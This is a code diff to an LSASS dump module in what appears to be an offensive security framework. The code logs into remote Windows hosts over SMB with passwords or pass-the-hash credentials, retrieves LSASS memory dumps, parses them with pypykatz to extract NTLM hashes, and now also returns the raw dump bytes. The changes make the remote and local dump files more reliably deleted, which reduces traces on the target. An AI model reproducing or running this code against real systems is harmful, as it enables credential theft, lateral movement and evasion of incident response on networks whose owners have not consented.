@@ -457,6 +457,7 @@ class LsassDumpModule(BaseModule):
                              for h in hashes],
             "protections":  protections,
             "mitigated":    False,
+            "dump_data":    getattr(self, "_last_dump_data", None) or b"",
         }
 
         raw["ntlm_hashes"] = raw.get("hashes", [])  # OUTPUTS key
@@ -652,45 +653,61 @@ class LsassDumpModule(BaseModule):
                 pass  # file not yet visible
             _time.sleep(1)
         from ares.core.security import secure_mkstemp
-        local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
-        import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB
-
+        local_dump = None
+        self._last_dump_data = b""
         try:
-            with open(local_dump, "wb") as f:
-                conn_smb.getFile("ADMIN$", f"Temp\\{dump_name}", f.write)
-        except Exception as exc:
-            logger.warning("lsass_dump_transfer_failed",
-                           target=target, error=str(exc)[:80],
-                           exc_type=type(exc).__name__)
-            conn_smb.logoff()
-            return []
+            local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
+            import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB
+
+            try:
+                with open(local_dump, "wb") as f:
+                    conn_smb.getFile("ADMIN$", f"Temp\\{dump_name}", f.write)
+            except Exception as exc:
+                logger.warning("lsass_dump_transfer_failed",
+                               target=target, error=str(exc)[:80],
+                               exc_type=type(exc).__name__)
+                return []
+            finally:
+                # Step 5: Delete dump from target
+                try:
+                    conn_smb.deleteFile("ADMIN$", f"Temp\\{dump_name}")
+                except Exception:
+                    try:
+                        self._run_remote_cmd(target, username, password, domain,
+                                             lmhash, nthash, f"del /f /q C:\\Windows\\Temp\\{dump_name}", dump_id)
+                    except Exception:
+                        pass
+                conn_smb.logoff()
+
+            # Read dump data into memory before parsing / deleting
+            try:
+                with open(local_dump, "rb") as f:
+                    self._last_dump_data = f.read()
+            except Exception:
+                pass
+
+            # Step 4: Parse with pypykatz
+            hashes = self._parse_dump(local_dump)
+            return hashes
         finally:
-            # Step 5: Delete dump from target
-            try:
-                conn_smb.deleteFile("ADMIN$", f"Temp\\{dump_name}")
-            except Exception:
-                pass
-            conn_smb.logoff()
-
-        # Step 4: Parse with pypykatz
-        hashes = self._parse_dump(local_dump)
-
-        # Secure-delete local dump
-        try:
-            with open(local_dump, "wb") as f:
-                f.write(b"\x00" * os.path.getsize(local_dump))
-            os.unlink(local_dump)
-        except Exception:
-            try:
-                os.unlink(local_dump)
-            except Exception:
-                pass
-
-        return hashes
+            # Secure-delete local dump
+            if local_dump and os.path.exists(local_dump):
+                try:
+                    with open(local_dump, "wb") as f:
+                        f.write(b"\x00" * os.path.getsize(local_dump))
+                    os.unlink(local_dump)
+                except Exception:
+                    try:
+                        os.unlink(local_dump)
+                    except Exception:
+                        pass
 
     def _get_lsass_pid(self, target: str, username: str, password: str,
                         domain: str, lmhash: str, nthash: str) -> int:
         """Get LSASS PID via remote tasklist."""
+        id_ = None
+        out_file = None
+        cleaned_up = False
         try:
             from impacket.smbconnection import SMBConnection
             from impacket.dcerpc.v5 import transport, scmr
@@ -706,16 +723,27 @@ class LsassDumpModule(BaseModule):
             import time as _t
             _t.sleep(1)
 
-            smb = SMBConnection(target, target, timeout=10)
-            smb.login(username, password, domain, lmhash, nthash)
+            smb = None
             buf = io.BytesIO()
             try:
-                smb.getFile("ADMIN$", f"Temp\\{out_file}", buf.write)
-                smb.deleteFile("ADMIN$", f"Temp\\{out_file}")
+                smb = SMBConnection(target, target, timeout=10)
+                smb.login(username, password, domain, lmhash, nthash)
+                try:
+                    smb.getFile("ADMIN$", f"Temp\\{out_file}", buf.write)
+                finally:
+                    try:
+                        smb.deleteFile("ADMIN$", f"Temp\\{out_file}")
+                        cleaned_up = True
+                    except Exception:
+                        pass
             except Exception:
                 pass
             finally:
-                smb.logoff()
+                if smb:
+                    try:
+                        smb.logoff()
+                    except Exception:
+                        pass
 
             output = buf.getvalue().decode("utf-8", errors="replace")
             for line in output.splitlines():
@@ -725,6 +753,14 @@ class LsassDumpModule(BaseModule):
                         return int(parts[1].strip())
         except Exception:
             pass
+        finally:
+            if out_file and not cleaned_up:
+                try:
+                    del_cmd = f"del /f /q C:\\Windows\\Temp\\{out_file}"
+                    self._run_remote_cmd(target, username, password, domain,
+                                         lmhash, nthash, del_cmd, f"DEL{id_ or 'PID'}")
+                except Exception:
+                    pass
         return 0
 
     def _run_remote_cmd(self, target: str, username: str, password: str,
